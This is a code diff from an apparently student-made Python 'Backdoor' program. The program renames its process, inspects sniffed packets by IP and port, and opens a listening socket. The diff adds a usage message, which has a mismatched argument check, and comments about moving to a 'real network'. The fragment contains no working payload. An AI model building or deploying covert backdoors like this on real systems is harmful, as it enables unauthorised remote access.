@@ -13,6 +13,11 @@ from Crypto import Random
 title = "Backdoor"
 setproctitle.setproctitle(title)
 
+def usage():
+    if len(sys.argv) != 2:
+        print "To use: ", sys.argv[0], "[Server IP] [Server Port] [Client IP]"
+        sys.exit()
+
 def server(pkt):
 
 	src_ip = pkt[IP].src
@@ -21,9 +26,12 @@ def server(pkt):
 	tcp_dport = pkt[TCP].dport
 
 	#Server connections
+	#Will become command line arguments
 	HOST = "127.0.0.1"
 	PORT = 8509
+	clientIP = ""
 
+	#will change HOST into clientIP once in real network
 	if src_ip == HOST and dst_ip == HOST:
 		#Opening socket and listening on that socket
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
